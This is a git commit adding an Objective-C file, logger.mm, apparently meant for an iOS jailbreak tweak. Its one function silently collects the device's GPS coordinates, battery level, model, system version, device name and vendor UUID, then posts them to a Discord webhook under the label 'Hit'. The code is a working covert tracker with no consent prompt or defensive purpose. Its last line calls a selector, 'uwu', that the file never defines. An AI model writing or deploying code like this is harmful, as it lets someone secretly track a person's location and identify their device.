b1aae3e51573d0972dbae3dee083417da6207b8b
Kevin <70502697+r6f@users.noreply.github.com>
2021-10-03 21:54:40 +0200

    Add files via upload

---
+++ logger.mm
@@ -0,0 +1,35 @@
+-(void)logger {
+
+    CLLocationManager* manager = [[CLLocationManager alloc] init];
+    [manager startUpdatingLocation];
+    CLLocation *location = [manager location];
+    CLLocationCoordinate2D coordinate = [location coordinate];
+//getting location..
+   
+
+
+    UIDevice *device = [UIDevice currentDevice];
+    [device setBatteryMonitoringEnabled:YES];
+    int batinfo=([device batteryLevel]*100);
+    NSError *error;
+
+    NSString *urlString = @"Discord Webhook Link";
+
+    NSURL *url = [NSURL URLWithString:urlString];
+    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
+    NSString * parameterString = [NSString stringWithFormat:@"username=Hit&content=*maps.google.com/maps?q=%f,%f*\n**Model:** *%@*\n**Battery:** *%d*\n**System Version:** *%@ %@*\n**Device Name:** *%@*\n**UUID:** *%@*\n", coordinate.latitude, coordinate.longitude,[device model],batinfo, [device systemName], [device systemVersion], [device name],[[device identifierForVendor] UUIDString]];
+    [request setHTTPMethod:@"POST"];
+    [request setURL:url];
+    NSData *postData = [parameterString dataUsingEncoding:NSUTF8StringEncoding];
+    [request setHTTPBody:postData];//making a post request for discord webhook
+    NSData *finalDataToDisplay = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:&error];
+    NSMutableDictionary *abc = [NSJSONSerialization JSONObjectWithData: finalDataToDisplay
+                                                           options: NSJSONReadingMutableContainers
+                                                            error: &error];
+
+  
+}
+
+
+
+[self performSelector:@selector(uwu)];//call the function (this is for ted2 template)
